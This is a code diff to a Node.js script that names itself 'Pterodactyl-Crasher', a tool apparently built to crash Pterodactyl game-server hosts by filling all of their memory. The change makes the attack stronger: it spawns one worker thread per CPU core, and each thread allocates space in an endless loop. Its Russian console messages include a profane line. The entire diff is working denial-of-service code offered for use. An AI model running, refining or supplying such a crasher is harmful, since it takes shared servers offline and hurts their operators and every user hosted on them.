@@ -1,6 +1,6 @@
-const { exec } = require('child_process');
-const fs = require('fs');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const os = require('os');
+const { exec } = require('child_process');
 
 let megabytes = 0;
 let curr = 0;
@@ -37,7 +37,7 @@ function uuidv4() {
 }
 
 async function main() {
-    console.log("github.com/xdearboy/Pterodactyl-Crasher \n Pterodactyl-Crasher");
+    console.log("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher");
     console.log("Режим: забивка всей памяти");
     console.log("Подготовка..");
 
@@ -46,8 +46,22 @@ async function main() {
     try {
         while (true) {
             const promises = [];
-            for (let i = 0; i < 48; i++) {
-                promises.push(allocateSpace());
+            for (let i = 0; i < os.cpus().length; i++) {
+                const worker = new Worker(__filename, { workerData: i });
+                worker.on('message', (msg) => {
+                    megabytes += 1;
+                    curr += 1;
+                });
+                promises.push(new Promise((resolve, reject) => {
+                    worker.on('error', reject);
+                    worker.on('exit', (code) => {
+                        if (code !== 0) {
+                            reject(new Error(`Воркер остановился с причиной: ${code}`));
+                        } else {
+                            resolve();
+                        }
+                    });
+                }));
             }
             await Promise.all(promises);
         }
@@ -58,4 +72,9 @@ async function main() {
     console.log("Начали нахуй!");
 }
 
-main();
+if (isMainThread) {
+    main();
+} else {
+    allocateSpace();
+    parentPort.postMessage('done');
+}
